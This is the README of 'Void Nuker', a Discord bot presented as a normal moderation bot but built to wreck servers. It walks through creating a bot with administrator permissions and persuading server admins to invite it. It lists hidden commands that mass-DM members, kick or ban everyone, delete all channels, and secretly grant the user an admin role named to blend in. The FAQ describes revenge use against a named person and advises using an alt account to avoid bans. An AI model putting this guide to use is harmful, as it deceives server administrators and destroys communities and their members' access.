# Void Nuker!


Void Nuker is a discord server nuker that is disguised as a normal moderation bot.

## Installation

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications) and select New Application, or select an old one if you already tried a bot that said to do this.

![](/images/step1.PNG)

2. Name your application, and agree to the Dev TOS and Dev Policy (even though we both know nobodys reading that)

![](/images/step2.PNG)

3. Go to the "Bot" tab of your application, and press "Add Bot". This will make your nuker a thing.

![](/images/step3.PNG)

4. Your bot should come up, play around with the name and pfp and "General Information" tab. Once done, click "Reset Token", and enter your 2FA code if you have that setup.

![](/images/step4.PNG)

5. Copy your token, i have mine blurred out for privacy reasons. Reminder: NEVER give your bots token or your token to ANYONE, if you dont know the code they will run with it.

![](/images/step5.PNG)

6. Paste your token into the "TOKEN" variable. This is what allows your bot to nuke the server.

![](/images/step6.PNG)

7. Go back to the dev portal, and go to OAuth2 > URL Generator. Click these exact checkmarks. If you dont see them, **look harder**.

![](/images/step7.PNG)
![](/images/step8.PNG)

8. Copy your url, and paste it into your notepad to save for later. Then paste it into BOT_INVITE.

![](/images/step10.PNG)

9. Convince the admins in your server to invite the bot.

![](/images/step11.PNG)

**Congratulations! The bot is now ready to use! Just play with the settings in main.py, and run the code. Your bot should be ready!**



##Commands

There are 2 types of commands - Normal and Fun. The normal commands are just "kick" "ban" "clear" and whatever else. The *fun* commands are "kickallmemberslmao" "dmeveryoneinserver", etc.

Normal Commands
```
#Kicks @Izzo8#8083
!kick @Izzo8#8083

#Bans @Blossom#3888
!ban @Blossom#3888

#Sends 'Pong!'
!ping

#Returns @Izz#9490's name, user id, highest role, status, etc.
!info @Izz#9490

#Sends BOT_INVITE's value from main.py
!invite

#Deletes the past 10 messages
!clear 10
```

Fun Commands
```
#DMs everyone in the server DM_MESSAGE from main.py
!dmeveryoneinserver

#Kicks everyone in server
!kickallmemberslmao

#Deletes all channels and replaces them with #FUCKED-BY-*your name here*. Also bans everyone.
!takecareofchannelsandban

#Makes a role with admin permissions, then gives you that role.
!giveadmintoyourself
```

##Variables

TOKEN = Your bot token. This is what connects Void Nuker to your Discord Bot.

PREFIX = What makes the bot know its a command, for example a command would be "!ping" if the prefix is !. 

DM_MESSAGE = If you run !dmeveryoneinserver, this is what it sends.

SPAM_MESSAGE = When channels are made, then it sends this message over and over, with @everyone attached to it.

CHANNEL_NAME = When !takecareofchannelsandban is run, it deletes all the channels and replaces it with multiple channels named this. Its typically "FUCKED-BY-*your name here* or "NUKED-BY-*your name here*

ROLE_NAME = When !giveadmintoyourself is run, it makes a role with admin perms. This is what the role is called. Make it something that will blend in, like "Member" or "@everyone".

BOT_INVITE = https://discord.com/api/oauth2/authorize?client_id=*your-bot-id-here*&permissions=8&scope=bot

## Contributing

Pull requests are welcome. For major changes, please open an issue first
to discuss what you would like to change.

Please make sure to update tests as appropriate.


## FAQ
 Q. Why are all of the fun commands extremely long? 
 
 A. **I dont want some stranger saying !nuke and then their server is destroyed and they lose all your trust in an un-satisfactorial way.**
    
Q. Is un-satisfactorial even a word?

A. **I have no idea, but lets pretend it is for now.**
    
Q. Who gave you inspiration for this?

A. **Izzo8#8083, for being an outright bitch, so i nuked their server with a crap bot, so i made a non-crap bot for everyone to not make the same mistakes i did.**
    
Q. Should i use an alt?

A. **Yes, i dont want your main banned.**
